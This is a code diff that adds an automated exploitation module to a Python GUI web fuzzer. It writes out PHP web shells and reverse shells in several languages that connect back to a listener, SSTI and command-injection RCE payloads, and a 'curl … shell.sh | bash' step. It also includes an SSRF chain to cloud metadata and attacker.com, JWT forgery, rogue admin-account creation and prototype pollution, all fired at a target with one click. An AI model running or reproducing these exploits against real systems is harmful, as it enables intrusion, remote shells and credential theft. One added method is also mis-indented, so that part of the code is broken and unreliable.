@@ -33,6 +33,16 @@ import uuid
 import html as html_module
 import traceback
 import math
+import subprocess
+import paramiko
+import socketserver
+import http.client
+import urllib3
+import websockets
+import asyncio
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.backends import default_backend
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 app = None
 
@@ -184,6 +194,544 @@ class BlindCallbackHandler(BaseHTTPRequestHandler):
 
     def log_message(self, format, *args):
         return
+
+# ==============================================
+# 💣 AUTO-EXPLOIT MODULE
+# ==============================================
+
+class AutoExploitModule:
+    def __init__(self, app):
+        self.app = app
+        self.lhost = self.app.get_local_ip()
+        self.lport = 4444
+        self.success_count = 0
+        self.failed_count = 0
+        self.listener_active = False
+        self.payloads = self._load_payloads()
+        self.exploit_chains = self._load_exploit_chains()
+        self.waf_bypass = self._load_waf_bypass()
+        self.owasp_2025 = self._load_owasp_2025()
+
+    def _load_payloads(self):
+        """🔥 Pre-built exploit payloads for RCE, file upload, etc."""
+        return {
+            'php': {
+                'simple': '<?php system($_GET["cmd"]); ?>',
+                'reverse': '<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\'"); ?>',
+                'waf_bypass': '<?=`$_GET[0]`;;?>',
+                'polyglot': 'GIF89a;\n<?php system($_GET["cmd"]); ?>',
+                'obfuscated': '<?php $a="sy";$b="stem";$a($b($_GET["cmd"])); ?>',
+                'lfi_rce': '<?php include($_GET["file"].".php"); ?>'
+            },
+            'python': {
+                'simple': 'import os; os.system("id")',
+                'reverse': 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);',
+                'exec': 'exec("import os;os.system(\\"id\\")")'
+            },
+            'nodejs': {
+                'simple': 'require("child_process").exec("id")',
+                'reverse': 'require("child_process").exec("bash -c \'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\'")',
+                'eval': 'eval("require(\\"child_process\\").exec(\\"id\\")")'
+            },
+            'java': {
+                'simple': 'Runtime.getRuntime().exec("id")',
+                'reverse': 'Runtime.getRuntime().exec(new String[]{"bash","-c","bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"})'
+            },
+            'jwt': [
+                '{"alg":"none","typ":"JWT"}.{"user":"admin"}.',
+                '{"alg":"HS256","typ":"JWT"}.eyJ1c2VyIjoiYWRtaW4ifQ.weak_signature',
+                '{"alg":"RS256","kid":"../../../../dev/null"}.{"user":"admin"}.'
+            ],
+            'graphql': [
+                'query { __schema { types { name } } }',
+                'mutation { createUser(username: "hacker", password: "hacked", role: "admin") { id } }',
+                'query { user1: user(id:1) { id } user2: user(id:2) { id } }'
+            ],
+            'wasm': [
+                'WebAssembly.instantiate(new Uint8Array([0,97,115,109,1,0,0,0]))'
+            ],
+            'ssrf': [
+                'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
+                'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
+                'http://localhost:8080/admin'
+            ],
+            'ssti': [
+                '{{7*7}}',
+                '${7*7}',
+                '<%= 7*7 %>',
+                '{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__.__import__("os").popen("id").read()}}{% endif %}{% endfor %}',
+                '{{config.__class__.__init__.__globals__["os"].popen("id").read()}}'
+            ]
+        }
+
+    def _load_exploit_chains(self):
+        """🚀 Advanced exploit chains (SSRF → RCE, etc.)"""
+        return {
+            'ssrf_to_rce': {
+                'name': 'SSRF → Cloud Metadata RCE',
+                'steps': [
+                    {'type': 'ssrf', 'payload': 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'},
+                    {'type': 'rce', 'payload': 'curl http://{lhost}:8000/shell.sh | bash'}
+                ]
+            },
+            'file_upload_rce': {
+                'name': 'File Upload → RCE',
+                'steps': [
+                    {'type': 'upload', 'payload': self.payloads['php']['polyglot'], 'filename': 'shell.gif'},
+                    {'type': 'trigger', 'payload': '/uploads/shell.gif?cmd=id'}
+                ]
+            },
+            'ssti_to_rce': {
+                'name': 'SSTI → RCE',
+                'steps': [
+                    {'type': 'ssti', 'payload': '{{7*7}}'},
+                    {'type': 'rce', 'payload': '{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__.__import__("os").popen("bash -c \'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\'").read()}}{% endif %}{% endfor %}'}
+                ]
+            }
+        }
+
+    def _load_waf_bypass(self):
+        """🛡️ WAF bypass techniques"""
+        return {
+            'http2_smuggling': [
+                'GET / HTTP/2\r\nHost: target.com\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n',
+                'POST / HTTP/2\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n'
+            ],
+            'unicode': [
+                '/?id=1%EF%BC%87%20OR%201=1--',
+                '/?cmd=%E2%80%A8id%E2%80%A9',
+                '/?search=test%u0027%20OR%201=1--'
+            ],
+            'jwt': [
+                '{"alg":"none","typ":"JWT"}.{"user":"admin"}.',
+                '{"alg":"HS256","typ":"JWT"}.eyJ1c2VyIjoiYWRtaW4ifQ.weak_signature'
+            ],
+            'file_upload': [
+                {'filename': 'shell.php.jpg', 'content_type': 'image/jpeg'},
+                {'filename': 'shell.php%00.jpg', 'content_type': 'image/jpeg'},
+                {'filename': 'shell.pHp', 'content_type': 'application/x-php'}
+            ],
+            'command_injection': [
+                ';id',
+                '|id',
+                '`id`',
+                '$(id)',
+                '||id',
+                '&&id',
+                '%0Aid',
+                '%0Did'
+            ]
+        }
+
+    def _load_owasp_2025(self):
+        """🔍 OWASP 2025 Top 10 Techniques"""
+        return {
+            'api_abuse': {
+                'mass_assignment': '{"user":{"role":"admin","password":"hacked"}}',
+                'excessive_data': '?fields=id,username,password,email,ssn,credit_card',
+                'broken_object': '{"user":{"__proto__":{"isAdmin":true}}}'
+            },
+            'graphql': {
+                'introspection': 'query { __schema { types { name } } }',
+                'batch_queries': 'query { user1: user(id:1) { id } user2: user(id:2) { id } }',
+                'alias_overloading': 'query { a1: user(id:1) { id } a2: user(id:1) { id } a3: user(id:1) { id } }'
+            },
+            'wasm': {
+                'memory_corruption': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',
+                'sandbox_escape': 'WebAssembly.instantiate(new Uint8Array([0,97,115,109,1,0,0,0]))'
+            },
+            'websocket': {
+                'admin_access': '{"action":"subscribe","channel":"admin"}',
+                'command_injection': '{"cmd":"bash -c \'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\'"}'
+            }
+        }
+
+    def start_listener(self):
+        """🎧 Start reverse shell listener"""
+        def listener_thread():
+            try:
+                server = socketserver.TCPServer((self.lhost, self.lport), socketserver.BaseRequestHandler)
+                server.handle_request = self._handle_connection
+                self.app.log(f"🎧 Listener started on {self.lhost}:{self.lport}")
+                self.listener_active = True
+                server.serve_forever()
+            except Exception as e:
+                self.app.log(f"❌ Listener error: {e}")
+                self.listener_active = False
+
+        threading.Thread(target=listener_thread, daemon=True).start()
+
+    def _handle_connection(self, request, client_address, server):
+        """🔌 Handle incoming reverse shell connection"""
+        self.app.log(f"🔌 Connection from {client_address[0]}:{client_address[1]}")
+        try:
+            request.sendall(b"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n")
+            self.app.log(f"💻 Shell established from {client_address[0]}")
+            self.app.show_popup("Shell Established", 
+                               f"Reverse shell connected!\n\nIP: {client_address[0]}\nPort: {client_address[1]}", 
+                               "success")
+        except:
+            pass
+
+    def exploit(self, target, vuln_type, param=None):
+        """🚀 Auto-exploit based on vulnerability type"""
+        self.start_listener()
+
+        if vuln_type in ['XSS', 'SQLi', 'Command Injection', 'RCE']:
+            return self._exploit_rce(target, param)
+        elif vuln_type == 'File Upload':
+            return self._exploit_file_upload(target)
+        elif vuln_type == 'SSRF':
+            return self._exploit_ssrf(target)
+        elif vuln_type == 'SSTI':
+            return self._exploit_ssti(target, param)
+        elif vuln_type == 'JWT':
+            return self._exploit_jwt(target)
+        elif vuln_type == 'GraphQL':
+            return self._exploit_graphql(target)
+        elif vuln_type == 'Prototype Pollution':
+            return self.exploit_prototype_pollution(target)
+        elif vuln_type == 'API_ABUSE':
+            return self._exploit_api_abuse(target)
+        
+        return False
+
+    def _exploit_rce(self, target, param):
+        """💣 RCE exploitation with multiple payloads"""
+        session = self.app.get_session()
+        payloads = [
+            f";id",
+            f"|id",
+            f"$(id)",
+            f"`id`",
+            f"&&id",
+            f"||id"
+        ]
+
+        for payload in payloads:
+            if param:
+                test_url = self.app.build_test_url(target, param, payload)
+            else:
+                test_url = f"{target}{payload}"
+                
+            try:
+                response = session.get(test_url, timeout=10)
+                if "uid=" in response.text.lower() or "gid=" in response.text.lower():
+                    self.app.log(f"🎯 RCE confirmed: {payload}")
+                    # Send reverse shell
+                    reverse_payload = self.payloads['python']['reverse'].format(lhost=self.lhost, lport=self.lport)
+                    if param:
+                        exploit_url = self.app.build_test_url(target, param, reverse_payload)
+                    else:
+                        exploit_url = f"{target}{reverse_payload}"
+                    session.get(exploit_url, timeout=10)
+                    return True
+            except:
+                continue
+
+        return False
+
+    def _exploit_file_upload(self, target):
+        """📁 File upload exploitation"""
+        session = self.app.get_session()
+        
+        # Try different file upload techniques
+        upload_attempts = [
+            {
+                'files': {'file': ('shell.php', self.payloads['php']['reverse'].format(lhost=self.lhost, lport=self.lport), 'image/gif')},
+                'endpoint': f"{target}/upload"
+            },
+            {
+                'files': {'upload': ('shell.php.jpg', self.payloads['php']['polyglot'], 'image/jpeg')},
+                'endpoint': f"{target}/upload.php"
+            },
+            {
+                'files': {'image': ('shell.pHp', self.payloads['php']['simple'], 'application/x-php')},
+                'endpoint': f"{target}/api/upload"
+            }
+        ]
+
+        for attempt in upload_attempts:
+            try:
+                response = session.post(attempt['endpoint'], files=attempt['files'], timeout=10)
+                if response.status_code in [200, 201]:
+                    # Try to trigger the shell
+                    shell_url = f"{target}/uploads/shell.php"
+                    session.get(shell_url, timeout=10)
+                    self.app.log("🎯 File upload RCE successful")
+                    return True
+            except:
+                continue
+
+        return False
+
+    def _exploit_ssrf(self, target):
+        """🔄 SSRF to RCE via cloud metadata"""
+        session = self.app.get_session()
+        ssrf_urls = [
+            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+            "http://[::ffff:a9fe:a9fe]/latest/meta-data/",
+            "http://localhost/admin",
+            "http://127.0.0.1:8080/admin"
+        ]
+
+        for url in ssrf_urls:
+            try:
+                # First test SSRF
+                response = session.get(target, params={'url': url, 'path': url}, timeout=10)
+                if "AccessKeyId" in response.text or "admin" in response.text.lower():
+                    self.app.log(f"🎯 SSRF confirmed: {url}")
+                    
+                    # Chain with RCE - try to execute command through SSRF
+                    rce_payload = f"curl http://{self.lhost}:8000/shell.sh | bash"
+                    exploit_url = f"{target}?url=http://attacker.com/rce?cmd={rce_payload}"
+                    session.get(exploit_url, timeout=10)
+                    return True
+            except:
+                continue
+
+        return False
+
+    def _exploit_ssti(self, target, param):
+        """📄 SSTI to RCE"""
+        session = self.app.get_session()
+        payloads = [
+            '{{7*7}}',
+            '${7*7}',
+            '<%= 7*7 %>',
+            '{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__.__import__("os").popen("id").read()}}{% endif %}{% endfor %}'
+        ]
+
+        for payload in payloads:
+            test_url = self.app.build_test_url(target, param, payload)
+            try:
+                response = session.get(test_url, timeout=10)
+                if "49" in response.text or "uid=" in response.text.lower():
+                    self.app.log(f"🎯 SSTI confirmed: {payload}")
+                    
+                    # Send reverse shell
+                    reverse_payload = '{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__.__import__("os").popen("bash -c \'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\'").read()}}{% endif %}{% endfor %}'
+                    exploit_url = self.app.build_test_url(target, param, reverse_payload.format(lhost=self.lhost, lport=self.lport))
+                    session.get(exploit_url, timeout=10)
+                    return True
+            except:
+                continue
+
+        return False
+
+    def _exploit_jwt(self, target):
+        """🔑 JWT exploitation"""
+        session = self.app.get_session()
+        jwt_payloads = [
+            'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.',
+            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.weak_signature'
+        ]
+
+        try:
+            # Try to get original JWT
+            response = session.get(target)
+            original_jwt = None
+            
+            # Check cookies
+            for cookie in session.cookies:
+                if 'token' in cookie.name.lower() or 'jwt' in cookie.name.lower():
+                    original_jwt = cookie.value
+                    break
+            
+            # Also check response headers
+            if not original_jwt and 'authorization' in response.headers:
+                auth_header = response.headers['authorization']
+                if auth_header.startswith('Bearer '):
+                    original_jwt = auth_header[7:]
+
+            # Test JWT payloads
+            for payload in jwt_payloads:
+                # Set in cookie
+                session.cookies.set('token', payload, domain=target.split('/')[2])
+                
+                # Test admin endpoint
+                admin_urls = [f"{target}/admin", f"{target}/dashboard", f"{target}/api/admin"]
+                for admin_url in admin_urls:
+                    try:
+                        response = session.get(admin_url, timeout=10)
+                        if response.status_code == 200 and ("admin" in response.text.lower() or "dashboard" in response.text.lower()):
+                            self.app.log("🎯 JWT exploit successful")
+                            return True
+                    except:
+                        continue
+                        
+        except Exception as e:
+            self.app.log(f"❌ JWT exploit error: {e}")
+
+        return False
+
+    def _exploit_graphql(self, target):
+        """📊 GraphQL exploitation"""
+        session = self.app.get_session()
+        
+        # Try common GraphQL endpoints
+        graphql_endpoints = [
+            f"{target}/graphql",
+            f"{target}/api/graphql",
+            f"{target}/gql",
+            f"{target}/query"
+        ]
+        
+        # Introspection query
+        introspection_query = {
+            "query": """
+            query {
+                __schema {
+                    types {
+                        name
+                        fields {
+                            name
+                        }
+                    }
+                }
+            }
+            """
+        }
+        
+        # Mutation for admin creation
+        mutation_query = {
+            "query": """
+            mutation {
+                createUser(username: "hacker", password: "hacked", role: "admin") {
+                    id
+                    username
+                }
+            }
+            """
+        }
+
+        for endpoint in graphql_endpoints:
+            try:
+                # Try introspection
+                response = session.post(endpoint, json=introspection_query, timeout=10)
+                if "__schema" in response.text:
+                    self.app.log(f"🎯 GraphQL introspection successful at {endpoint}")
+                    
+                    # Try mutation
+                    response = session.post(endpoint, json=mutation_query, timeout=10)
+                    if "hacker" in response.text or "admin" in response.text:
+                        self.app.log("🎯 GraphQL mutation successful")
+                        return True
+            except:
+                continue
+
+        return False
+
+    def _exploit_api_abuse(self, target):
+        """📡 API abuse exploitation"""
+        session = self.app.get_session()
+        
+        # Mass assignment attack
+        mass_assignment = {
+            "user": {
+                "name": "hacker",
+                "email": "hacker@example.com",
+                "role": "admin",
+                "password": "hacked",
+                "isAdmin": True
+            }
+        }
+        
+        # Excessive data exposure
+        excessive_fields = {
+            "fields": "id,username,email,password,ssn,credit_card,api_key,token"
+        }
+        
+        # Try different API endpoints
+        api_endpoints = [
+            f"{target}/api/users",
+            f"{target}/api/v1/users",
+            f"{target}/api/profile",
+            f"{target}/api/account"
+        ]
+        
+        for endpoint in api_endpoints:
+            try:
+                # Try mass assignment
+                response = session.post(endpoint, json=mass_assignment, timeout=10)
+                if response.status_code in [200, 201] and ("admin" in response.text.lower() or "hacker" in response.text):
+                    self.app.log(f"🎯 API mass assignment successful at {endpoint}")
+                    return True
+                
+                # Try excessive data
+                response = session.get(f"{endpoint}?fields={excessive_fields['fields']}", timeout=10)
+                if response.status_code == 200 and ("password" in response.text or "api_key" in response.text):
+                    self.app.log(f"🎯 Excessive data exposure at {endpoint}")
+                    return True
+                    
+            except:
+                continue
+        
+        return False
+
+    def exploit_prototype_pollution(self, target):
+        """🧩 Prototype pollution exploitation"""
+        session = self.app.get_session()
+        
+        # Prototype pollution payloads
+        pollution_payloads = [
+            {"__proto__": {"isAdmin": True}},
+            {"constructor": {"prototype": {"polluted": True}}},
+            {"polluted": "yes", "__proto__": {"isAdmin": True}}
+        ]
+        
+        # Test endpoints
+        test_endpoints = [
+            f"{target}/api/users",
+            f"{target}/api/v1/users",
+            f"{target}/api/profile",
+            f"{target}/api/update"
+        ]
+        
+        for endpoint in test_endpoints:
+            for payload in pollution_payloads:
+                try:
+                    response = session.post(endpoint, json=payload, timeout=10)
+                    if response.status_code in [200, 201]:
+                        # Check if pollution worked
+                        check_response = session.get(f"{endpoint}/me", timeout=10)
+                        if check_response.status_code == 200:
+                            text = check_response.text.lower()
+                            if ("admin" in text and "true" in text) or ("polluted" in text):
+                                self.app.log(f"🎯 Prototype pollution successful at {endpoint}")
+                                return True
+                except:
+                    continue
+        
+        return False
+
+    def chain_exploits(self, target, chain_name):
+        """🔗 Chain multiple exploits together"""
+        chain = self.exploit_chains.get(chain_name)
+        if not chain:
+            return False
+
+        self.app.log(f"🚀 Starting exploit chain: {chain['name']}")
+
+        for step in chain['steps']:
+            if step['type'] == 'ssrf':
+                if not self._exploit_ssrf(target):
+                    return False
+            elif step['type'] == 'upload':
+                if not self._exploit_file_upload(target):
+                    return False
+            elif step['type'] == 'rce':
+                if not self._exploit_rce(target, step.get('param')):
+                    return False
+            elif step['type'] == 'trigger':
+                session = self.app.get_session()
+                try:
+                    session.get(step['payload'], timeout=10)
+                    self.app.log(f"🎯 Trigger successful: {step['payload']}")
+                except:
+                    return False
+
+        return True
 
 class AdvancedNeonToggle(tk.Canvas):
     def __init__(self, master, variable, command=None, toggle_width=80, toggle_height=36, **kwargs):
@@ -1407,6 +1955,7 @@ class AdvancedNeonHunter:
         self.session_manager = SessionManager()
         self.payload_generator = AdvancedPayloadGenerator()
         self.batch_processor = BatchProcessor(self)
+        self.auto_exploit = AutoExploitModule(self)  # 🚀 Auto-exploit module
         
         # Setup advanced UI
         self.setup_enhanced_ui()
@@ -1423,11 +1972,10 @@ class AdvancedNeonHunter:
         self.log("🎨 ENHANCED UI WITH MULTI-WINDOW SUPPORT")
         self.log("📊 Professional Dashboard Activated")
         self.log("🔧 Advanced Features Enabled")
+        self.log("💥 AUTO-EXPLOIT MODULE LOADED")
         
         # Open dashboard by default (delayed to ensure UI is ready)
         self.root.after(1500, self.open_dashboard)
-
-
 
     def load_targets_from_file(self):
         """Wrapper method to load targets file"""
@@ -1527,6 +2075,7 @@ class AdvancedNeonHunter:
             ('<Control-t>', lambda e: self.test_connection()),
             ('<Control-m>', lambda e: self.open_live_monitor()),
             ('<F11>', lambda e: self.toggle_fullscreen()),
+            ('<Control-x>', lambda e: self.auto_exploit_current()),  # 💥 Auto-exploit shortcut
         ]
         
         for shortcut, command in shortcuts:
@@ -1657,6 +2206,14 @@ class AdvancedNeonHunter:
                             command=self.analyze_headers)
         tools_menu.add_command(label="🔐 SSL Checker", 
                             command=self.check_ssl)
+        tools_menu.add_separator()
+        tools_menu.add_command(label="💥 Auto-Exploit", 
+                            accelerator="Ctrl+X",
+                            command=self.auto_exploit_current)
+        tools_menu.add_command(label="🎧 Start Listener", 
+                            command=self.start_exploit_listener)
+        tools_menu.add_command(label="🔗 Chain Exploits", 
+                            command=self.chain_exploits_menu)
         
         # Help Menu with icons
         help_menu = tk.Menu(menubar, tearoff=0, bg='#000000', fg='#ffff00',
@@ -1960,6 +2517,11 @@ class AdvancedNeonHunter:
         NeonIconButton(buttons_frame, text="📋 BATCH", 
                       command=self.start_batch_scan, width=14).pack(side='left', padx=10)
         
+        # 💥 AUTO-EXPLOIT BUTTON
+        NeonIconButton(buttons_frame, text="💥 AUTO-EXPLOIT", 
+                      command=self.auto_exploit_current, 
+                      color_scheme="danger", width=18).pack(side='left', padx=10)
+        
         # Vulnerability toggles - Enhanced with cyberpunk styling
         vuln_frame = tk.LabelFrame(controls_frame, text="🔍 VULNERABILITIES TO TEST", 
                                   font=('Consolas', 13, 'bold'),
@@ -1981,6 +2543,9 @@ class AdvancedNeonHunter:
             ('XXE', '📋', '#ff0088'),
             ('SSRF', '🔄', '#00ff88'),
             ('JWT', '🔑', '#ffff88'),
+            ('API Abuse', '📡', '#ff0088'),
+            ('GraphQL', '📊', '#8800ff'),
+            ('WASM', '⚡', '#0088ff'),
         ]
         
         for i, (name, icon, color) in enumerate(vuln_data):
@@ -2151,6 +2716,8 @@ class AdvancedNeonHunter:
             'scan_start': {'foreground': '#00ffff', 'font': ('Consolas', 10, 'bold')},
             'scan_end': {'foreground': '#00ff88', 'font': ('Consolas', 10, 'bold')},
             'highlight': {'background': '#223322', 'foreground': '#ffffff'},
+            'exploit': {'foreground': '#ff0000', 'font': ('Consolas', 10, 'bold')},
+            'shell': {'foreground': '#00ff00', 'font': ('Consolas', 10, 'bold')},
         }
         
         for tag, config in tags.items():
@@ -2268,6 +2835,8 @@ class AdvancedNeonHunter:
             ("📥 Load Config", self.load_config),
             ("🔍 Header Analyzer", self.analyze_headers),
             ("🔐 SSL Checker", self.check_ssl),
+            ("💥 Auto-Exploit", self.auto_exploit_current),
+            ("🎧 Start Listener", self.start_exploit_listener),
             ("📖 Project Docs", self.show_project_docs),
             ("🎬 Tutorials", self.show_tutorials),
         ]
@@ -2313,6 +2882,25 @@ class AdvancedNeonHunter:
         self.stats_frame.pack(fill='both', expand=True, padx=20)
         
         self.create_stats_display()
+        
+        # 💥 Exploitation stats
+        exploit_frame = tk.LabelFrame(self.right_panel, text="💥 EXPLOITATION", 
+                                     font=('Consolas', 12, 'bold'),
+                                     fg='#ff0000', bg='#111133',
+                                     labelanchor='n')
+        exploit_frame.pack(fill='x', padx=10, pady=10)
+        
+        self.exploit_stats = {
+            'success': tk.Label(exploit_frame, text="✅ Success: 0", 
+                               fg='#00ff00', bg='#111133', font=('Consolas', 10)),
+            'failed': tk.Label(exploit_frame, text="❌ Failed: 0", 
+                              fg='#ff0000', bg='#111133', font=('Consolas', 10)),
+            'listener': tk.Label(exploit_frame, text="🎧 Listener: OFF", 
+                                fg='#ffff00', bg='#111133', font=('Consolas', 10))
+        }
+        
+        for stat in self.exploit_stats.values():
+            stat.pack(anchor='w', padx=10, pady=2)
         
         # Scan progress at bottom
         progress_frame = tk.Frame(self.right_panel, bg='#111133')
@@ -2411,6 +2999,8 @@ class AdvancedNeonHunter:
             tag = 'critical'
         elif any(word in msg.lower() for word in ['vulnerability', 'vuln']):
             tag = 'vulnerability'
+        elif any(word in msg.lower() for word in ['exploit', 'shell', 'rce']):
+            tag = 'exploit'
         elif any(word in msg.lower() for word in ['started']):
             tag = 'scan_start'
         elif any(word in msg.lower() for word in ['complete', 'finished']):
@@ -2515,6 +3105,18 @@ class AdvancedNeonHunter:
                                self.stats['requests_sent'] * 100)
                 self.stat_labels['rate'].config(text=f"{success_rate:.1f}%")
                 
+        # Update exploit stats
+        if hasattr(self, 'exploit_stats'):
+            self.exploit_stats['success'].config(
+                text=f"✅ Success: {self.auto_exploit.success_count}"
+            )
+            self.exploit_stats['failed'].config(
+                text=f"❌ Failed: {self.auto_exploit.failed_count}"
+            )
+            self.exploit_stats['listener'].config(
+                text=f"🎧 Listener: {'ON' if self.auto_exploit.listener_active else 'OFF'}"
+            )
+                
         # Update dashboard if open
         if hasattr(self, 'dashboard') and self.dashboard and self.dashboard.window.winfo_exists():
             self.update_dashboard_stats()
@@ -2553,6 +3155,133 @@ class AdvancedNeonHunter:
         if hasattr(self.dashboard, 'net_total'):
             self.dashboard.net_total.config(text=str(self.stats['requests_sent']))
             
+    # ==============================================
+    # 💥 AUTO-EXPLOIT METHODS
+    # ==============================================
+    
+    def auto_exploit_vulnerability(self, vuln_type, target, param=None):
+        """🚀 Auto-exploit detected vulnerabilities"""
+        self.log(f"💥 Attempting auto-exploit for {vuln_type}...")
+        
+        # Start listener
+        self.auto_exploit.start_listener()
+        self.auto_exploit.listener_active = True
+        
+        try:
+            success = False
+            
+            if vuln_type in ['XSS', 'SQLi', 'Command Injection', 'RCE']:
+                success = self.auto_exploit._exploit_rce(target, param)
+            elif vuln_type == 'File Upload':
+                success = self.auto_exploit._exploit_file_upload(target)
+            elif vuln_type == 'SSRF':
+                success = self.auto_exploit._exploit_ssrf(target)
+            elif vuln_type == 'SSTI':
+                success = self.auto_exploit._exploit_ssti(target, param)
+            elif vuln_type == 'JWT':
+                success = self.auto_exploit._exploit_jwt(target)
+            elif vuln_type == 'GraphQL':
+                success = self.auto_exploit._exploit_graphql(target)
+            elif vuln_type == 'API_ABUSE':
+                success = self.auto_exploit._exploit_api_abuse(target)
+            elif vuln_type == 'Prototype Pollution':
+                success = self.auto_exploit.exploit_prototype_pollution(target)
+            else:
+                self.log(f"❌ No auto-exploit available for {vuln_type}")
+                self.auto_exploit.listener_active = False
+                return False
+
+            if success:
+                self.auto_exploit.success_count += 1
+                self.log(f"🎯 Auto-exploit successful for {vuln_type}!", 'exploit')
+                self.show_popup("Exploit Success", 
+                              f"Successfully exploited {vuln_type}!\n\nCheck your listener on {self.auto_exploit.lhost}:{self.auto_exploit.lport}", 
+                              "success")
+                return True
+            else:
+                self.auto_exploit.failed_count += 1
+                self.log(f"❌ Auto-exploit failed for {vuln_type}")
+                return False
+                
+        except Exception as e:
+            self.auto_exploit.failed_count += 1
+            self.log(f"❌ Auto-exploit error: {e}")
+            return False
+        finally:
+            self.auto_exploit.listener_active = False
+
+    def auto_exploit_current(self):
+        """💥 Auto-exploit the most recent vulnerability"""
+        if not self.results:
+            messagebox.showwarning("No Vulnerabilities", "No vulnerabilities found to exploit")
+            return
+
+        last_vuln = self.results[-1]
+        target = last_vuln['url'].split('?')[0]  # Get base URL
+
+        self.auto_exploit_vulnerability(
+            last_vuln['vuln_type'],
+            target,
+            last_vuln['param']
+        )
+
+    def start_exploit_listener(self):
+        """🎧 Start exploit listener manually"""
+        if not self.auto_exploit.listener_active:
+            self.auto_exploit.start_listener()
+            self.log("🎧 Exploit listener started manually")
+            self.show_popup("Listener Started", 
+                          f"Exploit listener started on {self.auto_exploit.lhost}:{self.auto_exploit.lport}", 
+                          "info")
+        else:
+            self.log("🎧 Listener already running")
+
+    def chain_exploits_menu(self):
+        """🔗 Chain exploits menu"""
+        chain_window = tk.Toplevel(self.root)
+        chain_window.title("🔗 Chain Exploits")
+        chain_window.configure(bg='#000000')
+        chain_window.geometry("400x300")
+        
+        tk.Label(chain_window, text="🔗 CHAIN EXPLOITS", fg='#00ffff', bg='#000000',
+                font=('Consolas', 16, 'bold')).pack(pady=20)
+        
+        chains = [
+            ("SSRF → RCE", "ssrf_to_rce"),
+            ("File Upload → RCE", "file_upload_rce"),
+            ("SSTI → RCE", "ssti_to_rce"),
+        ]
+        
+        for chain_name, chain_id in chains:
+            frame = tk.Frame(chain_window, bg='#000000')
+            frame.pack(fill='x', padx=50, pady=10)
+            
+            NeonIconButton(frame, text=chain_name, 
+                          command=lambda c=chain_id: self.start_chain_exploit(c, chain_window),
+                          width=25).pack()
+        
+        tk.Button(chain_window, text="Cancel", command=chain_window.destroy).pack(pady=20)
+
+    def start_chain_exploit(self, chain_name, window):
+        """Start chain exploit"""
+        target = self.target_entry.get().strip()
+        if not target:
+            messagebox.showwarning("No Target", "Enter target URL first")
+            return
+            
+        window.destroy()
+        self.log(f"🔗 Starting exploit chain: {chain_name}")
+        
+        success = self.auto_exploit.chain_exploits(target, chain_name)
+        if success:
+            self.show_popup("Chain Successful", 
+                          f"Exploit chain '{chain_name}' completed successfully!", 
+                          "success")
+        else:
+            self.show_popup("Chain Failed", 
+                          f"Exploit chain '{chain_name}' failed", 
+                          "error")
+
     def start_direct_fuzz(self):
         try:
             self.play_click_sound()
@@ -2817,6 +3546,15 @@ class AdvancedNeonHunter:
         self.log("⏹️ Fuzzing stopped by user - monitors remain open")
         if hasattr(self, 'status_text_widget') and self.status_text_widget:
             self.status_text_widget.config(text="✅ READY", fg='#00ff00')
+    
+        def cleanup_threads(self):
+            """Clean up any orphaned threads"""
+        try:
+            if hasattr(self, 'fuzz_thread') and self.fuzz_thread:
+                if self.fuzz_thread.is_alive():
+                    self.fuzz_thread.join(timeout=1.0)
+        except:
+            pass        
             
     def start_blind_server(self):
         self.play_click_sound()
@@ -2879,22 +3617,7 @@ class AdvancedNeonHunter:
         except Exception as e:
             self.log(f"❌ Screenshot setup failed: {e}")
             return None
-    
             
-    def take_manual_screenshot(self):
-        """Take manual screenshot of current target"""
-        target = self.target_entry.get().strip()
-        if not target:
-            messagebox.showwarning("Error", "Enter target URL first")
-            return
-        
-        # Run in background thread to avoid UI freeze
-        def screenshot_thread():
-            screenshot_path = self.take_screenshot(target, f"manual_{int(time.time())}")
-            if screenshot_path and os.path.exists(screenshot_path.replace('.png', f'_{int(time.time())}.png')):
-                self.root.after(0, lambda: messagebox.showinfo("📸 Screenshot", 
-                                                              f"Screenshot saved:\n{screenshot_path}"))
-        
     def take_manual_screenshot(self):
         """Take manual screenshot of current target"""
         target = self.target_entry.get().strip()
@@ -2931,6 +3654,7 @@ bug bounty hunters, penetration testers, and security researchers.
 • Blind XSS server integration
 • Session management
 • Real-time monitoring
+• 💥 AUTO-EXPLOIT MODULE
 
 🔧 TECHNICAL SPECIFICATIONS:
 • Language: Python 3.8+
@@ -2938,6 +3662,7 @@ bug bounty hunters, penetration testers, and security researchers.
 • Dependencies: requests, beautifulsoup4, selenium
 • Concurrency: ThreadPoolExecutor
 • Reporting: HTML, CSV, JSON
+• Exploitation: Reverse shells, RCE, SSRF chains
 
 📁 PROJECT STRUCTURE:
 neonhunter/
@@ -2953,18 +3678,21 @@ neonhunter/
 2. Run: python main.py
 3. Enter target URL and select vulnerabilities
 4. Click START FUZZING
